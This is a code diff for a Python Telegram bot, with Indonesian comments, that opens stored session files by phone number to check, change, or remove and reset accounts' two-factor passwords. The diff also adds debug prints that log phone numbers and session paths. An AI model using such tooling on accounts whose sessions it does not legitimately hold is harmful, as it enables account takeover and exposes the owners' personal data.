@@ -3,12 +3,27 @@ from telethon import TelegramClient, errors
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ContextTypes
 
-SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'login3'))
+SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'a2_sessions'))
 
 # Fungsi untuk mengecek status 2FA
 async def check_2fa_status(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
     query = update.callback_query
     await query.answer()
+    
+    if not phone_number:
+        # Debug: Cek isi dari callback_data
+        print(f"Callback Data: {query.data}")  # Untuk debugging
+        try:
+            phone_number = query.data.split('_')[-1]  # Ambil nomor telepon dari callback_data
+        except IndexError:
+            phone_number = None
+
+    # Debug: Cek nilai phone_number
+    print(f"Phone Number: {phone_number}")
+
+    if not phone_number:
+        await query.message.reply_text("❌ Nomor telepon tidak ditemukan.", parse_mode='Markdown')
+        return
 
     session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
 
@@ -63,7 +78,7 @@ async def change_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_n
     return "OLD_PASSWORD"
 
 # Fungsi untuk menonaktifkan dan mengganti password 2FA
-async def remove_and_set_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def remove_and_set_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
     query = update.callback_query
     await query.answer()
 
@@ -72,6 +87,7 @@ async def remove_and_set_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE)
     phone_number = context.user_data.get("phone_number")
 
     session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
+    print(f"Session path: {session_path}")
 
     if not os.path.exists(session_path):
         await query.message.reply_text(f"❌ Session tidak ditemukan untuk:\n{phone_number}", parse_mode='Markdown')
